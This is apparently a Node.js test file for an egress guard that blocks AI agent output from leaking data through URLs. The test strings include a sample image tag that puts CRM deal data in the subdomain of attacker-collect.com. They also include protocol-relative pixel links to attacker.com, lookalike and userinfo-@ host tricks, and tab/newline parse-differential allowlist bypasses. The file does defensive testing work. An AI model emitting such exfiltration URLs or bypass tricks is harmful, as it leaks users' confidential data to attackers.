#!/usr/bin/env node
/**
 * egress-guard.test.mjs — proof for the outbound egress control, including the published CRM-agent image-exfiltration scenario.
 * Exit 1 on any failure.
 */
import { checkEgress } from './egress-guard.mjs';
import { openBroker } from './broker.mjs';

let pass = 0, fail = 0;
const ok = (c, m) => { if (c) pass++; else { fail++; console.error('  ✗ ' + m); } };

const allow = ['trusted-saas.test', 'chat.trusted-saas.test'];

// allowlisted, clean URL passes
ok(checkEgress('see https://help.trusted-saas.test/article', { allowHosts: allow }).ok, 'allowlisted clean URL passes');

// non-allowlisted host blocked
ok(!checkEgress('ping https://evil.example.com/x', { allowHosts: allow }).ok, 'non-allowlisted host blocked');

// --- case-study scenario: data in the subdomain of an external-image URL ---
const broker = openBroker('run-1', { key: 'k' });
broker.register('Acme Corp', { dataClass: 'tier0' });
broker.register('FAKEID000000000000', { dataClass: 'tier0' });
// the agent output contains an image tag whose subdomain carries the stolen deal data
const imgExfil = `<img src="https://Acme-Corp-dealsize-2400000.attacker-collect.com/pixel.png">`;
const r1 = checkEgress(imgExfil, { allowHosts: allow, broker });
ok(!r1.ok, 'image-URL exfiltration to a non-allowlisted host is blocked (passive render egress != send-tool)');

// even if the attacker host were allowlisted, data-in-subdomain is caught by the broker scan
const r2 = checkEgress('<img src="https://FAKEID000000000000.trusted-saas.test/p.png">', { allowHosts: allow, broker });
ok(!r2.ok && r2.blocked.some(b => /sensitive data/.test(b.reason)), 'data-bearing subdomain on an ALLOWLISTED host still blocked (exfil channel)');

// parse-ambiguity fails closed (trailing-dot / userinfo-@ tricks resolve to a non-allowlisted host)
ok(!checkEgress('https://trusted-saas.test.evil.com/x', { allowHosts: allow }).ok, 'lookalike host trusted-saas.test.evil.com blocked (suffix match is on a dot boundary)');
ok(!checkEgress('https://evil.com/@trusted-saas.test/x', { allowHosts: allow }).ok, 'userinfo-@ trick: real host evil.com blocked');
ok(!checkEgress('https://trusted-saas.test./x', { allowHosts: allow }).ok === false, 'trailing-dot host normalizes to trusted-saas.test (allowed)'); // trailing dot stripped -> allowed clean

// protocol-relative image src is still treated as egress
ok(!checkEgress('<img src="//data.attacker.com/x.png">', { allowHosts: allow }).ok, 'protocol-relative //host image src treated as egress + blocked');

// subdomain of an allowlisted host is allowed (legit)
ok(checkEgress('https://help.trusted-saas.test/x', { allowHosts: allow }).ok, 'subdomain of an allowlisted host allowed');

// --- REGRESSION (adversarial review) (1): tab/newline/CR parse-differential (same class as the published URL-parsing allowlist bypass) ---
// The WHATWG parser browsers use STRIPS \t\n\r before resolving; our extraction stopped at them, so the
// attacker host hid behind a clean allowlisted prefix. Guard must see the SAME host the browser resolves.
const tabAttack = '<img src="https://trusted-saas.test\t.FAKEID000000000000.attacker-collect.com/p.png">';
const rTab = checkEgress(tabAttack, { allowHosts: allow, broker });
ok(!rTab.ok, 'TAB-in-URL parse-differential blocked: browser resolves the attacker host, so must the guard');
ok(rTab.blocked.some(b => /attacker-collect\.com/.test(b.url) || /sensitive data/.test(b.reason)), 'the reconstructed (stripped) attacker host / leaked id is what gets blocked');
// a newline variant is the same class
ok(!checkEgress('href="https://trusted-saas.test\n.evil.com/x"', { allowHosts: allow }).ok, 'newline-in-URL parse-differential blocked');
// the clean (no strip char) allowlisted URL still passes — the tab is the differential, proven
ok(checkEgress('<img src="https://trusted-saas.test/p.png">', { allowHosts: allow }).ok, 'the identical no-tab allowlisted URL still passes (isolates the tab as the differential)');

// --- REGRESSION (adversarial review) (2): protocol-relative //host OUTSIDE src=/href= ---
ok(!checkEgress('![pixel](//data.attacker.com/x.png)', { allowHosts: allow }).ok, 'markdown-image protocol-relative //host blocked');
ok(!checkEgress('background: url(//data.attacker.com/x.png);', { allowHosts: allow }).ok, 'CSS url() protocol-relative //host blocked');
ok(!checkEgress('see //data.attacker.com/x for details', { allowHosts: allow }).ok, 'bare protocol-relative //host blocked');
ok(checkEgress('![ok](//help.trusted-saas.test/x.png)', { allowHosts: allow }).ok, 'protocol-relative //host on an allowlisted host still allowed (no false block)');

console.log(`egress-guard.test: ${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
